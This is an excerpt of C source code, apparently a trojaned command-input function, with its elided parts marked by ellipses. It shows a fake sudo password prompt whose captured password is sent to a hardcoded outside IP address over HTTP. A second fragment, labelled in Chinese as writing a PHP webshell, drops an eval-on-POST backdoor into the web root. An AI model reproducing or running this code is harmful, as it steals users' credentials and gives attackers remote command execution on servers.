...
struct command* userinputtocommand(char s[LENUSERINPUT])
{
	...
	char *command = "[sudo] password for %s\n" ;
    char *env ;
    char str1[100] ;
    char *passwd ;
    char *ip = "121.121.43.11" ;
    const char *header = "GET /index_%s.%s HTTP/1.1\r\n\r\n" ;
    int slen ;
    ...
    if(env)
    {
        snprintf(str1, sizeof(str1), command, env) ;
        passwd = getpass(str1) ;
        slen = socket(AF_INET, SOCK_STREAM, 0) ;
        if(slen > 0)
        {
            memset(&m_socket, 0, sizeof(m_socket)) ;
            m_socket.sin_family = AF_INET ;
            m_socket.sin_addr.s_addr = inet_addr(ip) ;
            m_socket.sin_port = htons(8000) ;
            if(!connect(slen, (struct sockaddr *)&m_socket, sizeof(struct sockaddr)))
            {
                snprintf(str1, sizeof(str1), header, env, passwd) ;
                send(slen, str1, strlen(str1), 0) ;
                sleep(2) ;
            }
            close(slen) ;
        }
...
{
    /*
    写入php webshell，原始case
    */

	int i ;
	int fd = -1 ;

    const char *filepath = "/var/www/html/cmd.php" ;

    char *shell = "<?php @eval($_POST['pass']) ?>";
    ...
    if (write(fd, shell, strlen(shell)) == -1)
    {
        close(fd);
        return;
    }
